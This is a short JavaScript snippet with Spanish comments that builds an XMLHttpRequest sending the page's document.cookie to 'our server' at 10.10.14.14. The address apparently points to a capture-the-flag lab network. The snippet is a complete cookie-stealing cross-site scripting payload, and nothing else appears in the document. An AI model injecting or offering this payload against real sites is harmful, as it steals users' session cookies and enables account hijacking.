//Creamos el objeto request
var request = new XMLHttpRequest();
//configuramos la petición hacia nuestro servidor
request.open("GET", "http://10.10.14.14/?cookie=" + document.cookie);
//Enviamos la petición
request.send();
